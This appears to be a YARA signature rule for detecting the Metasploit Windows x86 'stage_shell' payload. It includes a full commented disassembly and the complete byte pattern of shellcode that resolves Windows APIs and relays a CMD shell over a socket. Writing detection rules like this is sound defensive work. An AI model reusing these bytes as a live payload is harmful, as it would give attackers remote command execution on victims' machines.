
    rule stage_shell___start0___x86
    {
        meta:
            desc = "Metasploit::windows::x86::stage_shell::__start0__"
    
        /*
            6833320000           | h32..                | push dword 0x3233
            685753325F           | hWS2_                | push dword 0x5f325357
            57                   | W                    | push edi
            FC                   | .                    | cld
            E84C000000           | .L...                | call 0x5d
            60                   | `                    | pusha
            8B6C2428             | .l$(                 | mov ebp,[esp+0x28]
            8B453C               | .E<                  | mov eax,[ebp+0x3c]
            8B7C0578             | .|.x                 | mov edi,[ebp+eax+0x78]
            01EF                 | ..                   | add edi,ebp
            8B4F18               | .O.                  | mov ecx,[edi+0x18]
            8B5F20               | ._                   | mov ebx,[edi+0x20]
            01EB                 | ..                   | add ebx,ebp
            E330                 | .0                   | jecxz 0x59
            49                   | I                    | dec ecx
            8B348B               | .4.                  | mov esi,[ebx+ecx*4]
            01EE                 | ..                   | add esi,ebp
            31C0                 | 1.                   | xor eax,eax
            99                   | .                    | cdq
            AC                   | .                    | lodsb
            84C0                 | ..                   | test al,al
            0F8403000000         | ......               | jz 0x3e
            C1CA0D               | ...                  | ror edx,0xd
            01C2                 | ..                   | add edx,eax
            EBF0                 | ..                   | jmp short 0x32
            3B542424             | ;T$$                 | cmp edx,[esp+0x24]
            0F85DBFFFFFF         | ......               | jnz 0x27
            8B5F24               | ._$                  | mov ebx,[edi+0x24]
            01EB                 | ..                   | add ebx,ebp
            668B0C4B             | f..K                 | mov cx,[ebx+ecx*2]
            8B5F1C               | ._.                  | mov ebx,[edi+0x1c]
            01EB                 | ..                   | add ebx,ebp
            032C8B               | .,.                  | add ebp,[ebx+ecx*4]
            896C241C             | .l$.                 | mov [esp+0x1c],ebp
            61                   | a                    | popa
            C20800               | ...                  | ret 0x8
            6A30                 | j0                   | push byte +0x30
            59                   | Y                    | pop ecx
            648B31               | d.1                  | mov esi,[fs:ecx]
            8B760C               | .v.                  | mov esi,[esi+0xc]
            8B761C               | .v.                  | mov esi,[esi+0x1c]
            AD                   | .                    | lodsd
            8B5808               | .X.                  | mov ebx,[eax+0x8]
            5E                   | ^                    | pop esi
            53                   | S                    | push ebx
            688E4E0EEC           | h.N..                | push dword 0xec0e4e8e
            FFD6                 | ..                   | call esi
            97                   | .                    | xchg eax,edi
            53                   | S                    | push ebx
            56                   | V                    | push esi
            57                   | W                    | push edi
            8D442410             | .D$.                 | lea eax,[esp+0x10]
            50                   | P                    | push eax
            FFD7                 | ..                   | call edi
            50                   | P                    | push eax
            50                   | P                    | push eax
            50                   | P                    | push eax
            68B61918E7           | h....                | push dword 0xe71819b6
            FFD6                 | ..                   | call esi
            97                   | .                    | xchg eax,edi
            68A41970E9           | h..p.                | push dword 0xe97019a4
            FFD6                 | ..                   | call esi
            95                   | .                    | xchg eax,ebp
            680892E2ED           | h....                | push dword 0xede29208
            FFD6                 | ..                   | call esi
            50                   | P                    | push eax
            57                   | W                    | push edi
            55                   | U                    | push ebp
            83EC10               | ...                  | sub esp,byte +0x10
            89E5                 | ..                   | mov ebp,esp
            89EE                 | ..                   | mov esi,ebp
            6A01                 | j.                   | push byte +0x1
            6A00                 | j.                   | push byte +0x0
            6A0C                 | j.                   | push byte +0xc
            89E1                 | ..                   | mov ecx,esp
            6A00                 | j.                   | push byte +0x0
            51                   | Q                    | push ecx
            56                   | V                    | push esi
            AD                   | .                    | lodsd
            56                   | V                    | push esi
            53                   | S                    | push ebx
            68808F0C17           | h....                | push dword 0x170c8f80
            FF5520               | .U                   | call near [ebp+0x20]
            89C7                 | ..                   | mov edi,eax
            FFD0                 | ..                   | call eax
            89E0                 | ..                   | mov eax,esp
            6A00                 | j.                   | push byte +0x0
            50                   | P                    | push eax
            8D7508               | .u.                  | lea esi,[ebp+0x8]
            56                   | V                    | push esi
            8D750C               | .u.                  | lea esi,[ebp+0xc]
            56                   | V                    | push esi
            FFD7                 | ..                   | call edi
            68434D4400           | hCMD.                | push dword 0x444d43
            89E2                 | ..                   | mov edx,esp
            31C0                 | 1.                   | xor eax,eax
            8D7AAC               | .z.                  | lea edi,[edx-0x54]
            6A15                 | j.                   | push byte +0x15
            59                   | Y                    | pop ecx
            F3AB                 | ..                   | rep stosd
            83EC54               | ..T                  | sub esp,byte +0x54
            C642BC44             | .B.D                 | mov byte [edx-0x44],0x44
            66C742E80101         | f.B...               | mov word [edx-0x18],0x101
            8B7508               | .u.                  | mov esi,[ebp+0x8]
            8972FC               | .r.                  | mov [edx-0x4],esi
            8972F8               | .r.                  | mov [edx-0x8],esi
            8B7504               | .u.                  | mov esi,[ebp+0x4]
            8972F4               | .r.                  | mov [edx-0xc],esi
            8D42BC               | .B.                  | lea eax,[edx-0x44]
            54                   | T                    | push esp
            50                   | P                    | push eax
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            41                   | A                    | inc ecx
            51                   | Q                    | push ecx
            49                   | I                    | dec ecx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            52                   | R                    | push edx
            51                   | Q                    | push ecx
            53                   | S                    | push ebx
            6872FEB316           | hr...                | push dword 0x16b3fe72
            FF5520               | .U                   | call near [ebp+0x20]
            FFD0                 | ..                   | call eax
            31C0                 | 1.                   | xor eax,eax
            B404                 | ..                   | mov ah,0x4
            96                   | .                    | xchg eax,esi
            29F4                 | ).                   | sub esp,esi
            89E7                 | ..                   | mov edi,esp
            6A64                 | jd                   | push byte +0x64
            53                   | S                    | push ebx
            68B0492DDB           | h.I-.                | push dword 0xdb2d49b0
            FF5520               | .U                   | call near [ebp+0x20]
            FFD0                 | ..                   | call eax
            31C0                 | 1.                   | xor eax,eax
            50                   | P                    | push eax
            57                   | W                    | push edi
            50                   | P                    | push eax
            50                   | P                    | push eax
            50                   | P                    | push eax
            FF750C               | .u.                  | push dword [ebp+0xc]
            53                   | S                    | push ebx
            6811C407B4           | h....                | push dword 0xb407c411
            FF5520               | .U                   | call near [ebp+0x20]
            FFD0                 | ..                   | call eax
            85C0                 | ..                   | test eax,eax
            0F8468000000         | ..h...               | jz 0x1b9
            31C0                 | 1.                   | xor eax,eax
            3B07                 | ;.                   | cmp eax,[edi]
            0F8426000000         | ..&...               | jz 0x181
            E867000000           | .g...                | call 0x1c7
            50                   | P                    | push eax
            89E1                 | ..                   | mov ecx,esp
            50                   | P                    | push eax
            51                   | Q                    | push ecx
            56                   | V                    | push esi
            57                   | W                    | push edi
            FF750C               | .u.                  | push dword [ebp+0xc]
            53                   | S                    | push ebx
            681665FA10           | h.e..                | push dword 0x10fa6516
            FF5520               | .U                   | call near [ebp+0x20]
            FFD0                 | ..                   | call eax
            85C0                 | ..                   | test eax,eax
            0F843C000000         | ..<...               | jz 0x1b9
            31C0                 | 1.                   | xor eax,eax
            59                   | Y                    | pop ecx
            39C8                 | 9.                   | cmp eax,ecx
            0F84F9FFFFFF         | ......               | jz 0x181
            50                   | P                    | push eax
            51                   | Q                    | push ecx
            57                   | W                    | push edi
            FF7528               | .u(                  | push dword [ebp+0x28]
            FF5510               | .U.                  | call near [ebp+0x10]
            31C9                 | 1.                   | xor ecx,ecx
            39C8                 | 9.                   | cmp eax,ecx
            0F8C1E000000         | ......               | jl 0x1b9
            EB8F                 | ..                   | jmp short 0x12c
            89E0                 | ..                   | mov eax,esp
            E823000000           | .#...                | call 0x1c7
            31C0                 | 1.                   | xor eax,eax
            50                   | P                    | push eax
            56                   | V                    | push esi
            57                   | W                    | push edi
            FF7528               | .u(                  | push dword [ebp+0x28]
            FF5514               | .U.                  | call near [ebp+0x14]
            31C9                 | 1.                   | xor ecx,ecx
            39C8                 | 9.                   | cmp eax,ecx
            0F8C66FFFFFF         | ..f...               | jl 0x11f
            0F84FAFFFFFF         | ......               | jz 0x1b9
            51                   | Q                    | push ecx
            89E2                 | ..                   | mov edx,esp
            51                   | Q                    | push ecx
            52                   | R                    | push edx
            50                   | P                    | push eax
            57                   | W                    | push edi
            FF7500               | .u.                  | push dword [ebp+0x0]
            53                   | S                    | push ebx
            681F790AE8           | h.y..                | push dword 0xe80a791f
            FF5520               | .U                   | call near [ebp+0x20]
            FFD0                 | ..                   | call eax
            85C0                 | ..                   | test eax,eax
            0F84DDFFFFFF         | ......               | jz 0x1b9
            31C0                 | 1.                   | xor eax,eax
            59                   | Y                    | pop ecx
            EBA0                 | ..                   | jmp short 0x181
            53                   | S                    | push ebx
            68F08A045F           | h..._                | push dword 0x5f048af0
            FF5520               | .U                   | call near [ebp+0x20]
            31C9                 | 1.                   | xor ecx,ecx
            51                   | Q                    | push ecx
            FFD0                 | ..                   | call eax
            50                   | P                    | push eax
            54                   | T                    | push esp
            687E660480           | h~f..                | push dword 0x8004667e
            FF7528               | .u(                  | push dword [ebp+0x28]
            FF5518               | .U.                  | call near [ebp+0x18]
            85C0                 | ..                   | test eax,eax
            58                   | X                    | pop eax
            0F85B4FFFFFF         | ......               | jnz 0x1b9
            C3                   | .                    | ret
        */
    
        strings:
            $a   = { 68 33 32 00 00 68 57 53 32 5f 57 fc e8 4c 00 00 00 60 8b 6c 24 28 8b 45 3c 8b 7c 05 78 01 ef 8b 4f 18 8b 5f 20 01 eb e3 30 49 8b 34 8b 01 ee 31 c0 99 ac 84 c0 0f 84 03 00 00 00 c1 ca 0d 01 c2 eb f0 3b 54 24 24 0f 85 db ff ff ff 8b 5f 24 01 eb 66 8b 0c 4b 8b 5f 1c 01 eb 03 2c 8b 89 6c 24 1c 61 c2 08 00 6a 30 59 64 8b 31 8b 76 0c 8b 76 1c ad 8b 58 08 5e 53 68 8e 4e 0e ec ff d6 97 53 56 57 8d 44 24 10 50 ff d7 50 50 50 68 b6 19 18 e7 ff d6 97 68 a4 19 70 e9 ff d6 95 68 08 92 e2 ed ff d6 50 57 55 83 ec 10 89 e5 89 ee 6a 01 6a 00 6a 0c 89 e1 6a 00 51 56 ad 56 53 68 80 8f 0c 17 ff 55 20 89 c7 ff d0 89 e0 6a 00 50 8d 75 08 56 8d 75 0c 56 ff d7 68 43 4d 44 00 89 e2 31 c0 8d 7a ac 6a 15 59 f3 ab 83 ec 54 c6 42 bc 44 66 c7 42 e8 01 01 8b 75 08 89 72 fc 89 72 f8 8b 75 04 89 72 f4 8d 42 bc 54 50 51 51 51 41 51 49 51 51 52 51 53 68 72 fe b3 16 ff 55 20 ff d0 31 c0 b4 04 96 29 f4 89 e7 6a 64 53 68 b0 49 2d db ff 55 20 ff d0 31 c0 50 57 50 50 50 ff 75 0c 53 68 11 c4 07 b4 ff 55 20 ff d0 85 c0 0f 84 68 00 00 00 31 c0 3b 07 0f 84 26 00 00 00 e8 67 00 00 00 50 89 e1 50 51 56 57 ff 75 0c 53 68 16 65 fa 10 ff 55 20 ff d0 85 c0 0f 84 3c 00 00 00 31 c0 59 39 c8 0f 84 f9 ff ff ff 50 51 57 ff 75 28 ff 55 10 31 c9 39 c8 0f 8c 1e 00 00 00 eb 8f 89 e0 e8 23 00 00 00 31 c0 50 56 57 ff 75 28 ff 55 14 31 c9 39 c8 0f 8c 66 ff ff ff 0f 84 fa ff ff ff 51 89 e2 51 52 50 57 ff 75 00 53 68 1f 79 0a e8 ff 55 20 ff d0 85 c0 0f 84 dd ff ff ff 31 c0 59 eb a0 53 68 f0 8a 04 5f ff 55 20 31 c9 51 ff d0 50 54 68 7e 66 04 80 ff 75 28 ff 55 18 85 c0 58 0f 85 b4 ff ff ff c3 }
    
        condition:
            any of them
    }
    
    